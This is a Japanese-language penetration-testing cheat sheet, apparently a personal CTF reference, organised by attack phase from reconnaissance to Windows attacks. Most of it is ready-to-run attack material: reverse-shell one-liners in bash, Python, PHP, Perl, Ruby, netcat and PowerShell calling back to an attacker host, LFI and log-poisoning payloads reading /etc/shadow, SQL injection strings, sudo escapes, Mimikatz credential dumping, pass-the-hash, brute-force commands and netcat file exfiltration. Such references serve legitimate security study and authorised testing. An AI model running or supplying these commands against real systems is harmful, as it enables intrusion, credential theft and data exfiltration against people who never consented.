---
tags: [hacking, cheatsheet, pentest, command-reference]
category: Reference
date: 2026-03-28
---

# ハッキング コマンドチートシート

ペネトレーションテスト全フェーズで使うコマンド集。

---

## フェーズ一覧

1. [偵察・情報収集](#1-偵察情報収集)
2. [ポートスキャン・列挙](#2-ポートスキャン列挙)
3. [Webアプリ攻撃](#3-webアプリ攻撃)
4. [脆弱性調査・エクスプロイト](#4-脆弱性調査エクスプロイト)
5. [リバースシェル](#5-リバースシェル)
6. [TTYアップグレード](#6-ttyアップグレード)
7. [ポストエクスプロイト（Linux）](#7-ポストエクスプロイトlinux)
8. [権限昇格（Linux）](#8-権限昇格linux)
9. [パスワードクラック](#9-パスワードクラック)
10. [ファイル転送](#10-ファイル転送)
11. [ネットワーク・ピボット](#11-ネットワークピボット)
12. [Windows攻撃](#12-windows攻撃)

---

## 1. 偵察・情報収集

```bash
# ドメイン情報
whois <domain>
nslookup <domain>
dig <domain>
dig <domain> ANY        # 全レコード
dig <domain> MX         # メールサーバー

# サブドメイン列挙
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.<domain>

# SSL証明書からサブドメイン取得
# https://crt.sh/?q=%.<domain>

# IPアドレスから情報
host <IP>
fping -aqg 192.168.0.0/24   # ネットワーク内ホスト一覧

# ネットワーク内のホスト一覧 (nmap)
nmap -sn 192.168.0.0/24
```

---

## 2. ポートスキャン・列挙

```bash
# --- Nmap ---

# 標準スキャン（CTF標準）
nmap -sC -sV <IP>

# 全ポート高速スキャン → 詳細スキャン（2段階）
nmap -p- --min-rate 5000 <IP> -oN nmap/ports
nmap -sC -sV -p <ポート,リスト> <IP> -oN nmap/detailed

# UDP スキャン
nmap -sU -p 161,162,53 <IP>

# 脆弱性スキャン
nmap --script vuln -p <PORT> <IP>

# OS検出
nmap -O <IP>

# 全部入り
nmap -A <IP>

# --- Rustscan（高速） ---
rustscan -a <IP> -- -sC -sV

# --- SMB (445) ---
enum4linux -a <IP>
smbclient -L //<IP>/ -N           # 共有一覧
smbclient //<IP>/<share> -N       # 匿名接続
smbmap -H <IP>

# --- SNMP (161) ---
snmpwalk -c public -v1 <IP>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>

# --- LDAP (389) ---
ldapsearch -H ldap://<IP> -x -b "dc=<domain>,dc=com"

# --- NFS (2049) ---
showmount -e <IP>
mount -t nfs <IP>:/share /mnt/nfs

# --- FTP (21) ---
ftp <IP>         # anonymous ログイン試行
# user: anonymous / pass: (空 or email)
```

---

## 3. Webアプリ攻撃

### ディレクトリ・ファイル列挙

```bash
# Gobuster
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://<IP> -w <wordlist> -x php,html,txt,bak
gobuster dir -u https://<IP> -w <wordlist> -k   # HTTPS証明書エラー無視

# ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<IP>/FUZZ
ffuf -w <wordlist> -u http://<IP>/FUZZ -e .php,.html,.txt
ffuf -w <wordlist> -u http://<IP>/FUZZ -fc 403,404    # フィルタ

# feroxbuster（再帰的）
feroxbuster -u http://<IP> -w <wordlist>
```

### バーチャルホスト・サブドメイン

```bash
# ffuf でVHost探索
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.<domain>" -u http://<IP> -fc 302

# gobuster
gobuster vhost -u http://<domain> -w <wordlist>
```

### パラメータ・LFI/RFI

```bash
# LFI (Local File Inclusion)
http://<IP>/page?file=../../../etc/passwd
http://<IP>/page?file=../../../../etc/shadow
http://<IP>/page?file=/proc/self/environ

# LFI → RCE (ログポイズニング)
# /var/log/apache2/access.log に PHP を書き込む
curl "http://<IP>" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
http://<IP>/page?file=/var/log/apache2/access.log&cmd=id

# ディレクトリトラバーサル
curl "http://<IP>/../../../../etc/passwd"
```

### SQLインジェクション

```bash
# 手動テスト
'
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
" OR "1"="1

# sqlmap
sqlmap -u "http://<IP>/login" --data "user=admin&pass=test" --dbs
sqlmap -u "http://<IP>/page?id=1" --dbs
sqlmap -u "http://<IP>/page?id=1" -D <db> --tables
sqlmap -u "http://<IP>/page?id=1" -D <db> -T <table> --dump
sqlmap -u "http://<IP>/login" --data "user=*&pass=*" --level=5 --risk=3
```

### WordPress

```bash
wpscan --url http://<IP> --enumerate u        # ユーザー列挙
wpscan --url http://<IP> --enumerate vp       # 脆弱プラグイン
wpscan --url http://<IP> -U <user> -P <wordlist>  # パスワードブルートフォース
```

---

## 4. 脆弱性調査・エクスプロイト

```bash
# Searchsploit
searchsploit <service> <version>
searchsploit apache 2.4.49
searchsploit -m <EDB-ID>              # ローカルにコピー
searchsploit -x <EDB-ID>              # 内容表示

# Metasploit
msfconsole
search <keyword>
use <module>
show options
set RHOSTS <IP>
set LHOST <自分のIP>
run

# MSF: セッション操作
sessions -l
sessions -i <ID>
background         # セッションをバックグラウンドに
```

---

## 5. リバースシェル

```bash
# 攻撃者側リスナー
nc -lnvp 4444
nc -lnvp 8888

# --- ターゲット側ペイロード ---

# bash
bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"

# sh
sh -i >& /dev/tcp/<LHOST>/4444 0>&1

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# php
php -r '$sock=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# nc (netcat-traditional)
nc -e /bin/bash <LHOST> 4444

# nc (OpenBSD版)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> 4444 >/tmp/f

# perl
perl -e 'use Socket;$i="<LHOST>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# ruby
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# URL エンコードが必要な場合
# https://www.revshells.com/ で生成
```

---

## 6. TTYアップグレード

リバースシェルを安定した対話型シェルにアップグレードする。

```bash
# Step 1: ターゲット側でPTY起動
python3 -c 'import pty; pty.spawn("/bin/bash")'
# または
script /dev/null -c bash

# Step 2: Ctrl+Z でバックグラウンド

# Step 3: ローカルで stty設定 → フォアグラウンドに戻す
stty raw -echo; fg

# Step 4: ターミナルサイズ調整（任意）
stty rows 50 cols 200
export TERM=xterm
```

---

## 7. ポストエクスプロイト（Linux）

```bash
# 基本情報
whoami && id
hostname
uname -a
cat /etc/os-release

# ネットワーク
ip a
ifconfig
netstat -tulnp
ss -tulnp

# ユーザー
cat /etc/passwd
cat /etc/shadow          # root権限が必要
cat /etc/group
w                        # ログイン中ユーザー
last                     # ログイン履歴

# プロセス
ps aux
ps -ef

# 環境変数
env
printenv

# 設定ファイル・認証情報探索
find / -name "*.conf" 2>/dev/null
find / -name "*.txt" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "*.key" 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
grep -r "DB_PASSWORD" / 2>/dev/null

# フラグ探索
find / -name "*.txt" 2>/dev/null | xargs grep -l "flag\|THM\|HTB" 2>/dev/null
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
```

---

## 8. 権限昇格（Linux）

```bash
# sudo 権限確認（最重要）
sudo -l

# SUID/SGID ファイル
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Cronジョブ
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/root 2>/dev/null

# 書き込み可能ファイル
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# PATH インジェクション
echo $PATH
find / -perm -u=s 2>/dev/null | xargs ls -la

# capabilities
getcap -r / 2>/dev/null

# NFS (no_root_squash)
cat /etc/exports

# カーネル脆弱性確認
uname -a
searchsploit linux kernel <version>

# --- 自動化ツール ---

# LinPEAS（最も強力）
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# pspy（cronジョブ監視）
./pspy64

# sudo -l の GTFOBins 活用例
sudo vim -c ':!/bin/bash'
sudo find . -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo less /etc/passwd  → !bash
sudo awk 'BEGIN {system("/bin/bash")}'
sudo perl -e 'exec "/bin/bash"'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'
```

---

## 9. パスワードクラック

```bash
# --- John the Ripper ---

# パスワードハッシュをクラック
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# /etc/shadow をクラック
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# SSHキーをクラック
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# ZIPファイル
zip2john file.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

# ハッシュ形式確認
john --list=formats | grep -i <形式>

# --- Hashcat ---

# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA256
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM (Windows)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# --- Hydra（オンラインブルートフォース） ---

# SSH
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -L users.txt -P passwords.txt ssh://<IP>

# HTTP POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# SMB
hydra -l <user> -P /usr/share/wordlists/rockyou.txt smb://<IP>

# --- ハッシュ識別 ---
hash-identifier
hashid <hash>
```

---

## 10. ファイル転送

```bash
# --- 攻撃者 → ターゲット ---

# Python HTTPサーバー（攻撃者側）
python3 -m http.server 8080
python3 -m http.server 80

# ターゲット側でダウンロード
wget http://<LHOST>:8080/file.sh
curl -O http://<LHOST>:8080/file.sh

# SCP
scp file.txt user@<IP>:/tmp/

# --- ターゲット → 攻撃者 ---

# nc で受信（攻撃者側）
nc -lnvp 9999 > received_file

# nc で送信（ターゲット側）
nc <LHOST> 9999 < file_to_send

# --- Base64 エンコード転送 ---
# ターゲット側
base64 file.bin
# 攻撃者側でデコード
echo "<base64>" | base64 -d > file.bin
```

---

## 11. ネットワーク・ピボット

```bash
# SSH ローカルポートフォワード
# ターゲット内部ポートをローカルに転送
ssh -L <localport>:<target_internal_IP>:<target_port> user@<IP>
ssh -L 8080:127.0.0.1:80 user@<IP>

# SSH リモートポートフォワード
ssh -R <remoteport>:127.0.0.1:<localport> user@<IP>

# SSHダイナミックポートフォワード（SOCKS プロキシ）
ssh -D 1080 user@<IP>
# proxychains と組み合わせて内部ネットワークへアクセス
proxychains nmap -sT <internal_IP>

# chisel（HTTPトンネル）
# 攻撃者側
./chisel server -p 8000 --reverse

# ターゲット側
./chisel client <LHOST>:8000 R:<port>:127.0.0.1:<port>
```

---

## 12. Windows攻撃

```bash
# --- 情報収集 ---
whoami /all                    # 権限・グループ
systeminfo
ipconfig /all
net user
net localgroup administrators
tasklist

# --- PowerShell ---
Get-LocalUser
Get-LocalGroup
Get-Process
Get-Service

# --- 認証情報ダンプ ---
# Mimikatz (管理者権限)
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# --- SMB パスザハッシュ ---
crackmapexec smb <IP> -u administrator -H <NTLM_hash>
impacket-psexec administrator@<IP> -hashes :<NTLM_hash>

# --- Windows PrivEsc ---
# winPEAS
winPEAS.exe

# PowerUp
Invoke-AllChecks

# --- Windows リバースシェル ---
# PowerShell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## クイックリファレンス

### ペンテスト標準フロー

```
1. nmap -p- --min-rate 5000 <IP>        # 全ポートスキャン
2. nmap -sC -sV -p <ports> <IP>         # 詳細スキャン
3. gobuster / ffuf                       # ディレクトリ列挙
4. 各サービスの列挙・脆弱性調査
5. エクスプロイト → リバースシェル取得
6. TTYアップグレード
7. sudo -l / SUID / Cron 確認           # PrivEsc調査
8. linpeas.sh 実行
9. Root取得 → フラグ取得
```

### よく使うワードリスト

```bash
/usr/share/wordlists/rockyou.txt                                           # パスワード
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt              # ディレクトリ
/usr/share/seclists/Discovery/Web-Content/common.txt                      # Web一般
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt     # Web中規模
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt         # サブドメイン
/usr/share/seclists/Usernames/Names/names.txt                             # ユーザー名
```

### ポート番号早見表

| ポート | サービス | よくある攻撃 |
|-------|---------|------------|
| 21 | FTP | 匿名ログイン、ブルートフォース |
| 22 | SSH | ブルートフォース、鍵クラック |
| 23 | Telnet | 平文盗聴 |
| 25 | SMTP | ユーザー列挙 |
| 53 | DNS | ゾーン転送 |
| 80/443 | HTTP/S | Web攻撃全般 |
| 110 | POP3 | 認証情報 |
| 139/445 | SMB | 匿名共有、Pass-the-Hash |
| 161 | SNMP | Community String |
| 389 | LDAP | 認証情報列挙 |
| 1433 | MSSQL | SA認証、xp_cmdshell |
| 2049 | NFS | 不正マウント |
| 3306 | MySQL | 認証情報、SQLi |
| 3389 | RDP | ブルートフォース |
| 5432 | PostgreSQL | 認証情報 |
| 5985 | WinRM | 認証情報 |
| 6379 | Redis | 認証なしアクセス |
| 8080 | HTTP代替 | Web攻撃全般 |

---

## 関連リンク

- [GTFOBins](https://gtfobins.github.io/) — sudo/SUID バイナリ悪用
- [HackTricks](https://book.hacktricks.xyz/) — 手法リファレンス
- [revshells.com](https://www.revshells.com/) — リバースシェル生成
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — ペイロード集
- [ExplainShell](https://explainshell.com/) — コマンド解説

---

## 関連スキル

- [[Skills/Nmap]]
- [[Skills/Linux-PrivEsc]]
- [[Skills/Reverse-Shell]]
- [[Skills/SQL-Injection]]
- [[Tools/Gobuster]]
- [[Tools/ffuf]]
- [[Tools/John-the-Ripper]]
